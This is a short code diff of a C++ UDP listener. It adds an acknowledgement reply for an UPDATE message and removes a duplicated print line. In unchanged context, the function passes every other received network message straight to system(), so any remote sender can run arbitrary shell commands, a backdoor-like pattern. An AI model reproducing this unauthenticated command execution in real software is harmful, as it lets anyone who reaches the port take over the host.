@@ -69,11 +69,11 @@ int Recv_msg(int serv_port)
         if(UPDATE == std::string(mesg, n))
         {
             cout << "UPDATE" << endl;
+            Sendto(sockfd, "ok!", strlen("ok!"), 0, (struct sockaddr*)&cliaddr, len);
         }
         else
         {
             system(mesg);
-            cout << string(mesg, n) << endl;
             cout << string(mesg, n) << endl;
             Sendto(sockfd, "ok!", strlen("ok!"), 0, (struct sockaddr*)&cliaddr, len);
 
